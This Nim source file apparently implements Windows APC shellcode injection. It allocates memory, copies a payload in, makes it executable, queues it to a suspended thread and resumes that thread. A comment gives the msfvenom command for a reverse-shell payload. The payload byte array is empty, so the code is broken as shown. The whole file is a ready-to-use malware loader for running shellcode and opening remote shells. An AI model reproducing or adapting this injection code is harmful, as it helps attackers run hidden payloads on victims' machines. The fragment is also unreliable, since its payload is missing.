import winim/lean

proc queueAPC*(hThread: HANDLE, payloadAddr: pointer) =
    if QueueUserAPC(cast[PAPCFUNC](payloadAddr), hThread, 0) == FALSE:
        echo "[!] - QueueUserAPC failed: ", GetLastError()
        return
    echo "[+] - Queued APC to thread, resume thread to execute payload (if suspended)"

proc injectAPC*(hThread: HANDLE, payload: openArray[byte]) =
    let 
        payloadMem = VirtualAlloc(nil, payload.len, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
        reprPayloadMem = cast[int](payloadMem).toHex
    if payloadMem == nil:
        echo "[!] - VirtualAlloc failed: ", GetLastError()
        return
    echo "[+] - Allocated ", payload.len, " bytes at: ", reprPayloadMem

    copyMem(payloadMem, addr payload, payload.len)
    echo "[+] - Copied payload to allocated memory: 0x", reprPayloadMem

    var oldProtect: DWORD
    if VirtualProtect(payloadMem, cast[SIZE_T](payload.len), PAGE_EXECUTE_READWRITE, addr oldProtect) == FALSE:
        echo "[!] - VirtualProtect failed: ", GetLastError()
        return
    echo "[+] - Changed memory protection to PAGE_EXECUTE_READWRITE"

    if QueueUserAPC(cast[PAPCFUNC](payloadMem), hThread, 0) == FALSE:
        echo "[!] - QueueUserAPC failed: ", GetLastError()
        return
    echo "[+] - Queued APC to thread, resume thread to execute payload (if suspended)"

proc dummy*() =
    echo "I am a dummy!"


if isMainModule:
    # msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f nim
    const payload: array[460, byte] = [
        byte ] 
    var hThread = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](dummy), NULL, CREATE_SUSPENDED, NULL)
    hThread.injectAPC(payload)
    hThread.ResumeThread()
    discard readLine(stdin)
